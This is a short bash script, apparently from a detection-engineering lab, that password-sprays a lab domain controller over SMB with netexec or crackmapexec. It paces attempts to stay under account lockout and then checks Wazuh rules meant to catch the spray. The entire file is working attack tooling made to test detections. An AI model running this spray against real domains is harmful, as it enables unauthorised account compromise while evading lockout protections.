#!/usr/bin/env bash
#
# 01-spray.sh
# Password spray against the lab DC over SMB using netexec/crackmapexec.
# Sprays ONE password across ALL users, then moves to the next password.
# This is the realistic pattern: it stays under the per-account lockout
# threshold while still hammering the domain, which is exactly what rule
# 100120 (spray by source IP) is built to catch.
#
# Run from the Kali box:  ./01-spray.sh
#
set -u

DC="10.0.10.10"
USERS="$(dirname "$0")/users.txt"
PASSWORDS="$(dirname "$0")/passwords.txt"

# Pick netexec if present, else crackmapexec.
if command -v netexec >/dev/null 2>&1; then
    CME="netexec"
elif command -v crackmapexec >/dev/null 2>&1; then
    CME="crackmapexec"
else
    echo "Neither netexec nor crackmapexec is installed." >&2
    exit 1
fi

echo "[*] Spraying $DC with $CME"
echo "[*] One password at a time across all users, to stay under lockout."
echo

while IFS= read -r pass; do
    [ -z "$pass" ] && continue
    echo "=== trying password: $pass ==="
    # --continue-on-success keeps going so you see every hit.
    $CME smb "$DC" -u "$USERS" -p "$pass" --continue-on-success
    echo
    # Small pause between passwords so the SIEM timeframe windows line up.
    sleep 5
done < "$PASSWORDS"

echo "[*] Spray complete. Check the Wazuh dashboard for rules 100110 / 100120 / 100130 / 100140."
